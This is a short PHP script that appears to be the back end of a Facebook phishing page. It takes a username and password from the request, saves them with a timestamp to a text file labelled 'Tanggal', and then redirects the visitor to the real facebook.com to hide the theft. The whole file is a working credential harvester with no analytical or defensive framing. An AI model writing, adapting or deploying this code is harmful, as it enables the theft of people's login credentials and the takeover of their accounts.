<?php
$loc='https://facebook.com';
if (isset($_GET) && !empty($_GET)){
$data=$_GET['username'];
$pw=$_GET['password'];
$date=date('d/M/Y H:i', time()+3600*7);
$file=fopen('data.txt','w');
fwrite($file, "Username: $data\n");
fwrite($file, "Password: $pw\n");
fwrite($file, "Tanggal: $date\n");
fwrite($file, "++++++++++++\n");
fclose($file);
header('Location: '.$loc);
}
